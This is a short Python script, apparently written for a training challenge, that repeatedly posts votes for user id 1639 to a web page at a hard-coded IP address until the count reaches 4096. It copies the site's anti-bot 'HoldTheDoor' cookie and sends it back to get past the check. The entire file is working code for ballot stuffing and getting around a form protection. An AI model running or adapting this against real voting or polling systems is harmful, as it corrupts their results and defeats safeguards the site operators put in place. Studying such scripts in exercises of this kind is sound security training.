#!/usr/bin/python3
import requests

host = 'http://158.69.76.135/level1.php'
header = {'Content-Type': 'application/x-www-form-urlencoded', }
keydata = {
    'id': '1639',
    'holdthedoor': 'submit',
    'key': '0'
}

cookies = {
    'HoldTheDoor': '0'
}

votes = '1639    </td>\n    <td>\n4096'

web = requests.get(host)

while votes not in web.text:
    cookies['holdthedoor'] = web.cookies['HoldTheDoor']
    webdata = web.text
    letter = 0

    for letter in range(len(webdata)):
        try:
            user = webdata[letter] + webdata[letter + 1] + \
                webdata[letter + 2] + webdata[letter + 3]
            if user == keydata['id']:
                total_votes = webdata[letter + 23] + \
                    webdata[letter + 24] + \
                    webdata[letter + 25] + webdata[letter + 26]
                print('{} votes: {}'.format(user, total_votes))
                break
        except Exception:
            print('Error processing your votes')
    web = requests.post(host, data=keydata, headers=header, cookies=cookies)
print('\n\n -> COMPLETE 4096 VOTES!')
